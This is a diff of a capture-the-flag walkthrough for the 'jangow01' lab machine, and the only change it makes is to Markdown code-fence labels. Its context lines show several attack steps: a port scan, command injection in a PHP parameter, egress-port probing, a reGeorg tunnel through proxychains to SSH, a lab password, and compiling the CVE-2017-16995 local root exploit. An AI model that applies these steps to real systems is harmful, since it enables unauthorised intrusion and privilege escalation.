@@ -12,7 +12,7 @@ In this walkthrough I will show the different solutions I found to bypass an egr
 
 Let's go!  
 
-```plain
+```
 Nmap scan report for 192.168.56.118
 Host is up (0.00020s latency).
 Not shown: 65533 filtered tcp ports (no-response)
@@ -34,7 +34,7 @@ On the web server the directory listing is enabled and there is only one folder 
 
 Let's launch [Wapiti](https://github.com/wapiti-scanner/wapiti) on it:  
 
-```plain
+```
 [*] Lancement du module exec
 ---
 Exécution de commande dans http://192.168.56.118/site/busque.php via une injection dans le paramètre buscar
@@ -58,7 +58,7 @@ nc -zvn -w1 192.168.56.1 1-500
 
 Listening on the interface with *tshark* I eventually get a connection attempt on port 443 :  
 
-```plain
+```
 1 0.000000000 192.168.56.118 → 192.168.56.1 TCP 74 42128 → 443 [SYN] Seq=0 Win=29200 Len=0 MSS=1460 SACK_PERM=1 TSval=15199363 TSecr=0 WS=128
 2 0.000075280 192.168.56.1 → 192.168.56.118 TCP 54 443 → 42128 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0
 ```
@@ -146,7 +146,7 @@ ftp.close()
 
 The communication looks like this, starting with the server sending us his banner :  
 
-```plain
+```
 < 220 (vsFTPd 3.0.3)
 > USER jangow01
 < 331 Please specify the password.
@@ -165,7 +165,7 @@ The important part is the *PORT* command where we are asking the server to conne
 
 But the server doesn't connect immediatly to this port. In fact it occurs when we emmit the *LIST* command :  
 
-```plain
+```
 < drwxr-xr-x    3 0        0            4096 Oct 31 19:36 html
 ```
 
@@ -207,7 +207,7 @@ $ ssh -p 8888 127.0.0.1
 
 Thanks to the TTY we can *su* to the user *jangow01* using the password *abygurl69* :  
 
-```plain
+```
 www-data@jangow01:/var/www/html/site$ su jangow01
 Password: 
 jangow01@jangow01:/var/www/html/site$ id
@@ -252,7 +252,7 @@ The first step is to put [this PHP script](https://github.com/sensepost/reGeorg/
 
 Then you establish the tunnel like this :  
 
-```plain
+```
 $ python2 reGeorgSocksProxy.py -v DEBUG -p 11080 -u http://192.168.56.118/site/tunnel.php
 
                      _____
@@ -275,13 +275,13 @@ $ python2 reGeorgSocksProxy.py -v DEBUG -p 11080 -u http://192.168.56.118/site/t
 
 Third step, you must use [Proxychains-NG](https://github.com/rofl0r/proxychains-ng) with the following line in *proxychains.conf* :  
 
-```plain
+```
 socks5 127.0.0.1 11080
 ```
 
 Finally use SSH with Proxychains to connect to the SSH server (that is listening on the loopback interface on our target) :  
 
-```plain
+```
 $ ./proxychains4 -f proxychains.conf ssh jangow01@127.0.0.1
 [proxychains] config file found: proxychains.conf
 [proxychains] preloading ./libproxychains4.so
@@ -454,7 +454,7 @@ int main(int argc, char** argv)
 
 Unfortunately nothing interesting was extracted :  
 
-```plain
+```
 [24150] debugger started
 [24151] target started. will run '/tmp/jail/backup'
 [24150] child now at EIP = 0x7f6b820e5090
@@ -514,7 +514,7 @@ abnormal behavior!
 
 So, like everybody did, I searched for possible local exploits :  
 
-```plain
+```
 [+] [CVE-2017-16995] eBPF_verifier
 
    Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
@@ -558,7 +558,7 @@ So, like everybody did, I searched for possible local exploits :
 
 I used [the first in the list](https://www.exploit-db.com/exploits/45010) :  
 
-```plain
+```
 jangow01@jangow01:~$ gcc -o cve-2017-16995 cve-2017-16995.c
 jangow01@jangow01:~$ ./cve-2017-16995 
 [.] 
